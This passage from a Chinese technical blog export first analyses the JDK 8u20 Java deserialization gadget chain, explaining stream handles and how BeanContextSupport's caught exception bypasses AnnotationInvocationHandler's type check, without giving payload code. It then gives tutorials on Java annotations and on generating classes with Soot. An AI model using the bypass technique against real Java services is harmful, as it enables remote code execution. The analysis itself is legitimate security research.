<p>看下图，首先写入<code>TC_OBJECT,</code>常量<code>TC_OBJECT</code>的值是<code>(byte)0x73</code>，之后调用<code>writeClassDesc</code>方法写入类描述符，然后会调用到<code>writeNonProxyDesc</code>方法</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164415007.png" alt="image-20210521164415007"></p>
<p>进入writeNonProxyDesc方法，</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164739263.png" alt="image-20210521164739263"></p>
<p>写入<code>TC_CLASSDESC</code>的值是0x72，然后进入writeNonProxy方法</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164704196.png" alt="image-20210521164704196"></p>
<p>跟进去看看<code>getSerialVersionID</code>是做什么的，看下图可以发现，默认获取对象的<code>serialVersionUID</code>值，如果对象<code>serialVersionUID</code>的值为空则会计算出一个<code>serialVersionUID</code>的值</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521165047244.png" alt="image-20210521165047244"></p>
<p>返回writeNonProxy方法看看之后做了什么事情：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170116717.png" alt="image-20210521170116717"></p>
<p>回到writeNonProxyDesc方法</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170318982.png" alt="image-20210521170318982"></p>
<p>可以看到在对当前对象的序列化之后，进行了对父类对象的序列化，写入父类的class结构信息。</p>
<p>到这里子类和父类的class都写完了。</p>
<p>接下来回到代码，接下来会进入writeSerialData写入对象的属性值。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170927503.png" alt="image-20210521170927503"></p>
<p>进入可以看到slots存放的是对象数组，先是父类，然后才是子类对象：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521171332673.png" alt="image-20210521171332673"></p>
<p>这里梳理一下流程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">序列化类结构信息： 子类 - &gt; 父类</span><br><span class="line">  </span><br><span class="line">序列化对象信息： 父类 - &gt; 子类</span><br></pre></td></tr></table></figure>



<h2 id="利用链构造-2"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>这里我们先看一下8u20下AnnotationInvocationHandler类的readObject方法</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521174334090.png" alt="image-20210521174334090"></p>
<p>两步骤：</p>
<ul>
<li>先执行var1.defaultReadObject()来还原对象，从流里还原对象</li>
<li>检查this.type进行了是否为注解类，如果不是的话就报错</li>
</ul>
<p>注意<strong>AnnotationInvocationHandler 这个对象是先被成功还原</strong>，然后再抛出的异常。绕过就是利用了这一点。</p>
<h3 id="什么是反序列化句柄handle"><a href="#什么是反序列化句柄handle" class="headerlink" title="什么是反序列化句柄handle"></a>什么是反序列化句柄handle</h3><p>handle值是每一个对象自身的一个字段。</p>
<p>如果你连续两次序列化同一个对象，那么第二次序列化写入的就是第一个对象的handle。</p>
<p>可以发现，因为我们两次 writeObject 写入的其实是同一个对象，所以 Date 对象的数据只在第一次 writeObject 的时候被真实写入了。而第二次 writeObject 时，写入的是一个 TC_REFERENCE 的结构，随后跟了一个4 字节的 Int 值，值为 0x00 7e 00 01。这是什么意思呢？意思就是第二个对象引用的其实是 handle 为 0x00 7e 00 01 的那个对象。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521192832251.png" alt="image-20210521192832251"></p>
<p>在反序列化进行读取的时候，因为之前进行了两次 writeObject，所以为了读取，也应该进行两次 readObject：</p>
<ol>
<li>第一次 readObject 将会读取 TC_OBJECT 表示的第 1 个对象，发现是 Date 类型的对象，然后从流中读取此对象成员的值并还原。并为此 Date 对象分配一个值为 0x00 7e 00 01 的 handle。</li>
<li>第二个 readObject 会读取到 TC_REFERENCE，说明是一个引用，引用的是刚才还原出来的那个 Date 对象，此时将直接返回之前那个 Date 对象的引用。</li>
</ol>
<h3 id="反序列化与异常"><a href="#反序列化与异常" class="headerlink" title="反序列化与异常"></a>反序列化与异常</h3><p>如果一个类实现如下：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521191454663.png" alt="image-20210521191454663"></p>
<p>这个类的反序列化只能反序列化出来一个passcode属性为root的对象</p>
<p>如果该字段不是root，则会报错</p>
<p>那么如何来绕过这个字段的判断呢？</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521191917656.png" alt="image-20210521191917656"></p>
<p>这个类就可以，可以看到他在readObject函数里面，又一次使用了readObject方法来<strong>读取流中的下一个对象</strong></p>
<p>下一个对象如果不是root的话，会报异常，但是这个异常被catch住了，所以正常的反序列化流程还是可以执行完毕的。</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>经过<a href="https://xz.aliyun.com/t/7240#toc-3" target="_blank" rel="noopener">这篇</a>的分析:</p>
<blockquote>
<p>当我们序列化一个对象的时候，每次在写入序列化对象的时候，都会调用<code>handles.lookup</code>方法来判断该对象是否已经写入了，如果已经写入了，那么就会调用<code>writeHandle(h)</code>来写入引用类型标识和handle引用值<code>0x7e0000+handle</code></p>
</blockquote>
<p>在之前的7u21中</p>
<p>序列化顺序：HashSet.writeObject -&gt; AnnotationInvocationHandler.defaultWriteFields</p>
<p>反序列化顺序：HashSet.readObject -&gt; AnnotationInvocationHandler.readObject</p>
<p>但是在8u20中，AnnotationInvocationHandler.readObject限制了this.type必须是注解类型才可以。</p>
<p>如果不是的话，会抛出异常。</p>
<p>这个异常如果在反序列化过程当中被抛出，外层的HashSet也并没有catch处理，所以会报错。</p>
<p>所以我们需要找到一个类，除了最基本的序列化条件，还需要满足：</p>
<ul>
<li>重写了readObject方法</li>
<li>在自身的readObject方法中，还存在readObject方法的调用，并且对第二次的readObject方法存在异常的捕获。</li>
</ul>
<p>JRE8u20 中利用到了名为 BeanContextSupport 类。</p>
<p>这个类满足以上条件，负责来帮我们绕过的。</p>
<p>看一下BeanContextSupport的readObject源码：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521194016263.png" alt="image-20210521194016263"></p>
<p>进入readChildren方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521194127997.png" alt="image-20210521194127997"></p>
<p>发现这里读去了流中的下一个对象，符合构造条件</p>
<p><strong>在执行<code>ois.readObject()</code>时,这里try-catch了,但是没有把异常抛出来,程序会接着执行。</strong></p>
<p>如果这里可以把<code>AnnotationInvocationHandler</code>对象在<code>BeanContextSupport</code>类第二次writeObject的时候写入，这样反序列化时，即使<code>AnnotationInvocationHandler</code>对象 this.type的值为<code>Templates</code>类型也不会报错。</p>
<blockquote>
<p>反序列化还有两点就是:</p>
<p>1.反序列化时类中没有这个成员,依然会对这个成员进行反序列化操作,但是之后会抛弃掉这个成员。</p>
<p>2.每一个新的对象都会分配一个newHandle的值,newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用<code>TC_REFERENCE</code>结构,引用前面handle的值。</p>
</blockquote>
<p>构造太复杂了 有空补上</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">lalajun</a>/<a href="https://www.anquanke.com/post/id/82934" target="_blank" rel="noopener">高级利用</a>/<a href="https://www.cnblogs.com/litlife/p/12571787.html#transformedmap" target="_blank" rel="noopener">lazymap</a>/<a href="https://xz.aliyun.com/t/3847#toc-8" target="_blank" rel="noopener">浅析Java序列化和反序列化</a>/</p>
<p><a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/" target="_blank" rel="noopener">javassist</a>/<a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/" target="_blank" rel="noopener">B4llo0n</a>/<a href="https://www.anquanke.com/post/id/232592" target="_blank" rel="noopener">anquanke</a>/<a href="https://xz.aliyun.com/t/1756#toc-3" target="_blank" rel="noopener">aliyun</a>/<a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">平安</a>/<a href="https://paper.seebug.org/1242/#commonscollections-2" target="_blank" rel="noopener">seebug</a></p>
<p><a href="https://www.anquanke.com/post/id/190468#h3-6" target="_blank" rel="noopener">wh1t3p1g</a>/<a href="https://www.anquanke.com/post/id/240040" target="_blank" rel="noopener">6&amp;7</a>/<a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">b1ngz</a>/<a href="https://xz.aliyun.com/t/6884" target="_blank" rel="noopener">7u21</a>/<a href="https://www.anquanke.com/post/id/207762" target="_blank" rel="noopener">8u20</a>/<a href="https://blog.csdn.net/silentbalanceyh/article/details/8183849" target="_blank" rel="noopener">序列化规范</a>/<a href="https://xz.aliyun.com/t/9566" target="_blank" rel="noopener">8u20</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Java注解</title>
    <url>/Java%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>事不凝滞,理贵变通。</p>
</blockquote>
<p>写框架离不开Java注解，今天来总结。</p>
<a id="more"></a>



<h1 id="Java元注解"><a href="#Java元注解" class="headerlink" title="Java元注解"></a>Java元注解</h1><blockquote>
<p>注解在Java语言中放在  { 类、方法、字段、参数 } 前的一个特殊的“注释”。</p>
<p>注解是一种用作标注的“元数据”。</p>
</blockquote>
<blockquote>
<p>四个：@Retention @Target @Docuement @Inherited</p>
</blockquote>
<p><strong>@Retention</strong>：注解的保留位置　　　　　　　　　</p>
<p>​    @Retention(RetentionPolicy.SOURCE)   //注解仅存在于源码中，在编译期就被丢掉了，不会被class包含。</p>
<p>​    @Retention(RetentionPolicy.CLASS)     // 不会加载进JVM，注解会在class字节码文件中存在，但运行时无法获得。</p>
<p>​    @Retention(RetentionPolicy.RUNTIME)  // 注解会在class字节码文件中存在，在运行时可以通过反射获取到。</p>
<p><strong>这里如果@Retention未标注，默认是CLASS阶段</strong>。</p>
<p>通常我们自定义的都是RUNTIME阶段，一定要标注。</p>
<p><strong>@Target</strong>：注解的作用目标</p>
<p>​    @Target(ElementType.TYPE)   //接口、类、枚举</p>
<p>​    @Target(ElementType.FIELD) //字段、枚举的常量</p>
<p>​    @Target(ElementType.METHOD) //方法</p>
<p>​    @Target(ElementType.PARAMETER) //方法参数</p>
<p>​    @Target(ElementType.CONSTRUCTOR)  //构造函数</p>
<p>​    @Target(ElementType.LOCAL_VARIABLE)//局部变量</p>
<p>​    @Target(ElementType.ANNOTATION_TYPE)//注解</p>
<p>​    @Target(ElementType.PACKAGE) ///包   </p>
<p><strong>@Document</strong>：说明该注解将被包含在javadoc中</p>
<p><strong>@Inherited</strong>：说明子类可以继承父类中的该注解。</p>
<p>​    @Inherited仅针对@Target(ElementType.TYPE)类型的注解有效，并且仅针对类的继承，对接口的继承无效。</p>
<h1 id="Java注解的使用"><a href="#Java注解的使用" class="headerlink" title="Java注解的使用"></a>Java注解的使用</h1><p>写个小demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> "info"</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本注解仅针对method，作用在runtime阶段。</p>
<p>使用该注解的方式应为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Report</span>(id=xxx,type=xxx,level=xxx,value=xxx)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMethod</span><span class="params">(...)</span></span></span><br></pre></td></tr></table></figure>

<p>default的意义在于如果使用注解的时候未给参数赋值，可以采用default预先写好的值。</p>
<p>如果注解想在多个target使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(&#123;</span><br><span class="line">        ElementType.METHOD,</span><br><span class="line">        ElementType.TYPE</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> "info"</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h1><p>必须要写：</p>
<ul>
<li>@Target</li>
<li>@Retention</li>
</ul>
<p>可定义多个参数和默认值，核心参数使用value名称。</p>
<p>应当设置@Retention(RetentionPolicy.RUNTIME)便于运行期读取该Annotation。</p>
<p>Java提供的使用反射API读取<code>Annotation</code>的方法包括：</p>
<p>判断某个注解是否存在于<code>Class</code>、<code>Field</code>、<code>Method</code>或<code>Constructor</code>：</p>
<ul>
<li><code>Class.isAnnotationPresent(Class)</code></li>
<li><code>Field.isAnnotationPresent(Class)</code></li>
<li><code>Method.isAnnotationPresent(Class)</code></li>
<li><code>Constructor.isAnnotationPresent(Class)</code></li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 判断@Report是否存在于Person类:</span><br><span class="line">Person.class.isAnnotationPresent(Report.class);</span><br></pre></td></tr></table></figure>

<p>使用反射API读取Annotation：</p>
<ul>
<li><code>Class.getAnnotation(Class)</code></li>
<li><code>Field.getAnnotation(Class)</code></li>
<li><code>Method.getAnnotation(Class)</code></li>
<li><code>Constructor.getAnnotation(Class)</code></li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 获取Person定义的@Report注解:</span><br><span class="line">Report report = Person.class.getAnnotation(Report.class);</span><br><span class="line">int type = report.type();</span><br><span class="line">String level = report.level();</span><br></pre></td></tr></table></figure>



<p>demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.FIELD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>某个JavaBean：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Range</span>(min=<span class="number">1</span>, max=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Range</span>(max=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">public</span> String city;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写一个<code>Person</code>实例的检查方法，它可以检查<code>Person</code>实例的<code>String</code>字段长度是否满足<code>@Range</code>的定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">  <span class="comment">// 遍历所有Field:</span></span><br><span class="line">    <span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">        <span class="comment">// 获取Field定义的@Range:</span></span><br><span class="line">        Range range = field.getAnnotation(Range<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 如果@Range存在:</span></span><br><span class="line">        <span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取Field的值:</span></span><br><span class="line">            Object value = field.get(person);</span><br><span class="line">            <span class="comment">// 如果值是String:</span></span><br><span class="line">            <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                String s = (String) value;</span><br><span class="line">                <span class="comment">// 判断值是否满足@Range的min/max:</span></span><br><span class="line">                <span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid field: "</span> + field.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>参考：</p>
<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1265102803921888" target="_blank" rel="noopener">liaoxuefeng</a></p>
<p><a href="https://www.cnblogs.com/peida/archive/2013/04/24/3036689.html" target="_blank" rel="noopener">竹子</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>使用soot创建类文件</title>
    <url>/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>鱼沉雁杳天涯路，始信人间别离苦。</p>
</blockquote>
<p>老博客归档。</p>
<a id="more"></a>

<h1 id="如何创建一个类"><a href="#如何创建一个类" class="headerlink" title="如何创建一个类"></a>如何创建一个类</h1><p>之前看ASM创建一个类，很实费劲，需要直接写字节码口令，这次尝试用Soot API写一下最简单的Hello World。</p>
<h2 id="加载java-lang-Object和库类"><a href="#加载java-lang-Object和库类" class="headerlink" title="加载java.lang.Object和库类"></a>加载<code>java.lang.Object</code>和库类</h2><p>我们知道所有对象的父类都是Object类，那么上来第一步，先添加两个依赖类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建两个依赖类</span></span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.Object"</span>);</span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.System"</span>);</span><br></pre></td></tr></table></figure>

<p>这里，教程上说，当你loadClassAndSupport时候，相关类的所有内容都会被加载进来，一招拿下！</p>
<h2 id="创建一个新SootClass对象"><a href="#创建一个新SootClass对象" class="headerlink" title="创建一个新SootClass对象"></a>创建一个新<code>SootClass</code>对象</h2><p>接下来创建我们创建的这个类就叫做HelloWorld。在Soot里面需要用<code>SootClass</code>来封装，并将其父类设置为<code>java.lang.Object</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sClass = <span class="keyword">new</span> SootClass(<span class="string">"HelloWorld"</span>, Modifier.PUBLIC);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sClass.setSuperclass(Scene.v().getSootClass(<span class="string">"java.lang.Object"</span>));</span><br></pre></td></tr></table></figure>

<p>这会将新创建的类的父类设置为的<code>SootClass</code>对象<code>java.lang.Object</code>。注意使用工具的方法<code>getSootClass</code>上<code>Scene</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scene.v().addClass(sClass);</span><br></pre></td></tr></table></figure>

<p>这会将新创建的<code>HelloWorld</code>类添加到中<code>Scene</code>。<code>Scene</code>一旦创建，所有类都应该属于它们。</p>
<h2 id="向SootClass添加方法"><a href="#向SootClass添加方法" class="headerlink" title="向SootClass添加方法"></a>向<code>SootClass</code>添加方法</h2><p>想向Soot类添加一个sout方法，打印helloworld，首先需要main方法。</p>
<p>目前Helloworld类的<code>main()</code>方法还是空的。</p>
<p>现在有了<code>SootClass</code>，我们需要向其中添加方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">method = <span class="keyword">new</span> SootMethod(<span class="string">"main"</span>,                 </span><br><span class="line">    Arrays.asList(<span class="keyword">new</span> Type[] &#123;ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>)&#125;),</span><br><span class="line">    VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);</span><br></pre></td></tr></table></figure>

<p>解读：</p>
<p>在这里需要首先写出一个main方法，他是public&amp;static的，并且main方法接受一个<code>java.lang.String</code>的参数数组，并且返回void。</p>
<p>SootClass：</p>
<p>每个SootClass代表一个Java对象，我们可以实例化该类，也可以为它指定类型。</p>
<p>如果想要获得<code>java.lang.String</code>的类型，我们可以用<code>RefType.v(&quot;java.lang.String&quot;)</code>。</p>
<p>如果现在已经有了一个SootClass对象sc，我们可以用<code>sc.getType()</code>获取对应的类型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sClass.addMethod(method);</span><br></pre></td></tr></table></figure>

<p>此代码将main方法添加到其所属类，也就是sClass。</p>
<h2 id="向方法添加代码"><a href="#向方法添加代码" class="headerlink" title="向方法添加代码"></a>向方法添加代码</h2><p>如果方法不包含任何代码，则它是无用的。我们继续向该<code>main</code>方法添加一些代码。为此，我们必须为代码选择一个中间表示形式。</p>
<h3 id="创建JimpleBody"><a href="#创建JimpleBody" class="headerlink" title="创建JimpleBody"></a>创建<code>JimpleBody</code></h3><p>Jimple是soot四个中间表示形式之一，也是最受欢迎的。</p>
<p>在Soot中，通常这一步是将一个Body附加在SootMethod对象上，也就是附加到之前我们声明的method对象上。</p>
<p>每个Body知道自己属于哪个SootMethod，但是每个SootMethod每次只能有一个activeBody：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SootMethod.getActiveBody()</span><br></pre></td></tr></table></figure>

<p>更准确滴说，每个Body有三个特征组件：</p>
<ol>
<li><p>Local</p>
<p>Body体内的局部变量；</p>
</li>
<li><p>Trap</p>
<p>哪些代码用来捕获哪些异常；</p>
</li>
<li><p>Unit</p>
<p>Unit表示语句本身；</p>
</li>
</ol>
<p>所以接下来，我们需要给main方法添加一个Jimple主体，再像主体添加代码语句；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JimpleBody body = Jimple.v().newBody(method);</span><br><span class="line">method.setActiveBody(body);</span><br></pre></td></tr></table></figure>

<p>我们将Jimple单例对象称为<code>JimpleBody</code>与我们的方法相关联的新对象，并使它成为方法的活动主体。</p>
<p>这里先看一下Jimple中间代码：</p>
<p><img src="../images/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200718212825394.png" alt="image-20200718212825394"></p>
<p>接下来下面就需要按照目标Jimple一步步来做。</p>
<h3 id="添加本地变量"><a href="#添加本地变量" class="headerlink" title="添加本地变量"></a>添加本地变量</h3><p>添加本地变量需要用到arg，所以直接写；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">arg = Jimple.v().newLocal(<span class="string">"l0"</span>, ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>));</span><br><span class="line">body.getLocals().add(arg);</span><br></pre></td></tr></table></figure>

<p>这里是为啥呢，我的理解；</p>
<p>对于sout(“Helloworld!”)来说，我们需要有一个字符串变量，最后打印的也是他，不难理解；</p>
<p>这里局部变量还有一个就是打印对象，在Java里面，所有东西都是对象；</p>
<p>这里第二个就是java.io.PrintStream对象，打印流对象；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//加入局部变量，java.io.PrintStream tmpRef</span><br><span class="line">tmpRef = Jimple.v().newLocal(&quot;tmpRef&quot;, RefType.v(&quot;java.io.PrintStream&quot;));</span><br><span class="line">body.getLocals().add(tmpRef);</span><br></pre></td></tr></table></figure>

<h3 id="添加方法代码"><a href="#添加方法代码" class="headerlink" title="添加方法代码"></a>添加方法代码</h3><p>添加方法就需要unit了，直接写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//组成链，l0 = @parameter0</span></span><br><span class="line">            units.add(Jimple.v().newIdentityStmt(arg,</span><br><span class="line">                    Jimple.v().newParameterRef(ArrayType.v</span><br><span class="line">                            (RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>), <span class="number">0</span>)));</span><br></pre></td></tr></table></figure>

<p>理解：</p>
<p>就在上面一步，arg是我们的字符串变量，交给JVM时候，他就是字符串变量l0。</p>
<p>继续写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//继续组成链，tmpRef = java.lang.System.out</span></span><br><span class="line">            units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef(</span><br><span class="line">                    Scene.v().getField(<span class="string">"&lt;java.lang.System: java.io.PrintStream out&gt;"</span>).makeRef())));</span><br></pre></td></tr></table></figure>

<p>理解：</p>
<p>这里其实就是把上面的tmpRef给到System.out对象，这里仍有存疑，之后会慢慢看。</p>
<p>最后一步，赋值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// insert "tmpRef.println("Hello world!")"</span></span><br><span class="line">            &#123;</span><br><span class="line">                SootMethod toCall = Scene.v().getMethod(<span class="string">"&lt;java.io.PrintStream: void println(java.lang.String)&gt;"</span>);</span><br><span class="line">                units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(<span class="string">"Hello world!"</span>))));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>我们获得带有签名的方法<code>&lt;java.io.PrintStream: void println(java.lang.String)&gt;</code>（该方法名为<code>println</code>，属于<code>PrintStream</code>，返回<code>void</code>并采用一个 <code>String</code>作为其参数-这足以唯一地标识该方法），并使用StringConstant“ Hello world！”调用它。</p>
<h2 id="写到类文件里面"><a href="#写到类文件里面" class="headerlink" title="写到类文件里面"></a>写到类文件里面</h2><p>将程序编写为<code>.class</code>文件的首选方法是使用ASM后端。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> java_version = Options.v().java_version();</span><br><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">BafASMBackend backend = <span class="keyword">new</span> BafASMBackend(sClass, java_version);</span><br><span class="line">backend.generateClassFile(streamOut);</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure>

